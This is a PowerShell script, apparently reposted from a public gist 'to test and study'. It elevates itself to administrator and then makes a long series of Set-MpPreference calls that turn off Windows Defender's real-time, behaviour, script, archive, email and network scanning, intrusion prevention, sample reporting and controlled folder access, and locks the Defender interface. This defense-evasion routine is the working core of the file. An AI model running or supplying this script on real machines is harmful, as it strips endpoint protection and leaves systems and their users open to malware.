#NOT MY CODE, this is simply meant to be a way to test, and study the code without the possibility of it being changed maliciously
#the code comes from Private-Locker, LL user, https://github.com/PrivateLocker code link https://gist.github.com/PrivateLocker/6711c4fe88eae75774284bd6efc377dc#file-disable-ps1
#"A paranoid person, is a safe person." -some smart person
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{   
$arguments = "& '" + $myinvocation.mycommand.definition + "'"
Start-Process powershell -Verb runAs -ArgumentList $arguments
Break
}
function Check-IsElevated
{
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object System.Security.Principal.WindowsPrincipal($id)

    if ($p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        Write-Output $true
    }            
    else
    {
        Write-Output $false
    }       
}
function Check-IsWindows10
{
    if ([System.Environment]::OSVersion.Version.Major -ge "10") 
    {
        Write-Output $true
    }
    else
    {
        Write-Output $false
    }
}
If ($ProcessError) 
{
    Write-Warning -Message "Something went wrong!";
	pause;
}
if (!(Check-IsElevated))
{
	$ProcessError
}
if (!(Check-IsWindows10))
{
    exit 0           
}
function disabledefender {
	try {
		Set-MpPreference -Force -DisableRealtimeMonitoring 1  
	} catch {
		$ProcessError
	}
	try {
Set-MpPreference -Force -DisablePrivacyMode 1 
	} catch {
		$ProcessError
	}
	try {
Set-MpPreference -Force -DisableAutoExclusions 0 
	} catch {
		$ProcessError
	}
	try {
Set-MpPreference -Force -DisableScanningNetworkFiles 1 
	} catch {
		$ProcessError
	}
	try {
Set-MpPreference -Force -DisableIntrusionPreventionSystem 1 
	} catch {
		$ProcessError
	}
	try {
		Set-MpPreference -Force -MAPSReporting Disabled 
	} catch {
		$ProcessError
	}
	try {
		Set-MpPreference -Force -SubmitSamplesConsent Never 
	} catch {
		$ProcessError
	}
Set-MpPreference -Force -CheckForSignaturesBeforeRunningScan 0 
Set-MpPreference -Force -DisableBehaviorMonitoring 1 
Set-MpPreference -Force -DisableIOAVProtection 1 
Set-MpPreference -Force -DisableScriptScanning 1 
Set-MpPreference -Force -DisableRemovableDriveScanning 1 
Set-MpPreference -Force -DisableBlockAtFirstSeen 1 
Set-MpPreference -Force -PUAProtection Disabled 
Set-MpPreference -Force -RandomizeScheduleTaskTimes 0 
Set-MpPreference -Force -SignatureUpdateInterval 32000 
Set-MpPreference -Force -SignatureUpdateInterval 32000 
Set-MpPreference -Force -ReportingAdditionalActionTimeOut 1 
Set-MpPreference -Force -ReportingCriticalFailureTimeOut 1 
Set-MpPreference -Force -ReportingNonCriticalTimeOut 1 
Set-MpPreference -Force -DisableArchiveScanning 1 
Set-MpPreference -Force -DisableEmailScanning 1 
Set-MpPreference -Force -EnableControlledFolderAccess Disabled  
Set-MpPreference -Force -EnableNetworkProtection Disabled 
Set-MpPreference -Force -DisableRestorePoint 1 
Set-MpPreference -Force -DisableScanningMappedNetworkDrivesForFullScan 1 
Set-MpPreference -Force -DisableIntrusionPreventionSystem 1 
Set-MpPreference -Force -UILockdown 1 
Write-Host "If no errors, Script is finished. Defender is now Disabled."
}
disabledefender
